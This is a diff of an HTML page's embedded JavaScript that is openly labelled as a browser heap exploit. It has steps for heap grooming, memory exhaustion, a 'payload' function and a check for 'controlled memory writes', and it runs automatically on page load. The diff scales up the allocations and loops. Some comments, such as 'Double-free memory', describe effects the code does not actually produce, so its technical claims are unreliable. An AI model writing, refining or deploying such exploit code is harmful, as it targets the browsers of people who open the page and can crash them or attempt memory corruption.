@@ -11,8 +11,8 @@ let UUU = 1;
 // Step 1: Initialize Controlled Memory
 function initializeHeap() {
     let buffers = [];
-    for (let i = 0; i < 1024; i++) {  
-        buffers.push(new ArrayBuffer(1000)); 
+    for (let i = 0; i < 1024; i++) {
+        buffers.push(new ArrayBuffer(4096)); // Larger blocks for better grooming
     }
     return buffers;
 }
@@ -21,116 +21,88 @@ function initializeHeap() {
 function groomHeap() {
     let tempArray = [];
 
-    // Allocate and deallocate in patterns
-    for (let i = 0; i < 4096; i++) {  
-        let buffer = new ArrayBuffer(4096); 
+    for (let i = 0; i < 4096; i++) {
+        let buffer = new ArrayBuffer(4096);
         tempArray.push(buffer);
         UUU++;
     }
 
-    // Deallocate some of the buffers to create holes in the heap
-    for (let i = 0; i < 2048; i++) {  
-        tempArray[i] = null; 
+    for (let i = 0; i < 2048; i++) {
+        tempArray[i] = null; // Free up space to create holes in the heap
     }
 
     return tempArray;
 }
 
-let varx = 1 * (100 ** 100);
-let varc = 0 * (0 ^ 0);
-
-// Step 3: Memory Exhaustion Function with Fragmentation
+// Step 3: Memory Exhaustion Function
 function memExh() {
-    let a = new ArrayBuffer(varx);
-    let se_a = new Uint8Array(a); 
+    let a = new ArrayBuffer(10000000); // Larger buffer for memory exhaustion
+    let se_a = new Uint8Array(a);
     let c = new ArrayBuffer(32);
     let se_c = new Uint8Array(c);
     let bufferArray = [];
-
-    for (let i = 0; i < 1048; i++) {  
-        // Alternating between 1MB and 512KB allocations
-        let buffer;
-        if (i % 2 === 0) {
-            buffer = new ArrayBuffer(1 * 1024 * 1024); // Allocate 1MB chunks
-        } else {
-            buffer = new ArrayBuffer(512 * 1024); // Allocate 512KB chunks
-        }
-
-        bufferArray.push(buffer);
-
-        // Simulating a less aggressive memory clear
-        if (bufferArray.length > 2048) {  
-            bufferArray = []; // Clear buffer array to exhaust memory
-
-            // Double-free memory simulation
-            a = ArrayBuffer(varc);
-            a = null;
-
-            // Fill with known data
+    for (let i = 0; i < 4096; i++) { // Increased iterations
+        bufferArray.push(new ArrayBuffer(1000000)); // Allocate larger buffers
+        if (bufferArray.length > 4096) {
+            bufferArray = [];
+            // Double-free memory
+            // Freeing and reusing memory after double-free
             for (let j = 0; j < se_a.length; j++) {
-                se_a = null; 
-                break;
+                se_a[j] = 0x41; // Fill with 'A'
             }
-        }
-
-        // Optional: Log progress to console every 1000 iterations
-        if (i % 1000 === 0) {
-            console.log(`Allocated ${i + 1} memory chunks.`);
         }
     }
 }
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(10000); 
-    let iterationCount = 0; 
+    let largeString = "B".repeat(100000); // Larger initial string
+    let nestedArray = [];
+    let obj = {};
+    let iterationCount = 0;
 
-    largeString += largeString;
-    if (largeString.length > 100000) { 
-        largeString = "B".repeat(10000); 
-    }
+    while (true) {
+        largeString += largeString;
+        if (largeString.length > 100000000) {
+            largeString = "B".repeat(100000);
+        }
 
-    memExh(); // Run memory exhaustion
+        memExh(); // Call memory exhaustion during payload
 
-    iterationCount++;
-    if (iterationCount > 50) {
-        return; // Limit iterations
+        iterationCount++;
+        if (iterationCount > 50) {
+            break; // Limit iterations to avoid endless loop
+        }
     }
 }
 
 // Step 5: Perform the Exploit
 function performExploit() {
-    let controlledBuffers = initializeHeap(); 
-    let groomedHeap = groomHeap(); 
+    let controlledBuffers = initializeHeap(); // Initialize the heap
+    let groomedHeap = groomHeap(); // Groom the heap
 
-    // Start memory corruption process
-    for (let i = 0; i < 1024; i++) {  
-        let buffer = new ArrayBuffer(1000); 
-        controlledBuffers.push(buffer);
-    }
-
-    // Allocate known block of memory
-    let buffer = new ArrayBuffer(64); 
-    let view = new Uint8Array(buffer); 
+    // Allocate and control known block of memory
+    let buffer = new ArrayBuffer(64); // 64 bytes
+    let view = new Uint8Array(buffer); // View it as an array of bytes
 
     // Fill with known data
     for (let i = 0; i < view.length; i++) {
         view[i] = 0x41; // Fill with 'A' (0x41)
     }
 
-    payload(); // Execute payload
+    // Run the exploit
+    payload();
 
     // Check for controlled memory writes
     for (let i = 0; i < view.length; i++) {
-        if (view[i] !== 0x41) { 
+        if (view[i] !== 0x41) { // Check for changes from the initial pattern
             alert("Memory corruption detected at index " + i + ": " + view[i]);
             break;
         }
-        alert("Memory buffer after grooming " + i + ": " + se_c[i]);
     }
 }
 
-performExploit(); // Start exploit process
+performExploit();
 </script>
 </body>
 </html>
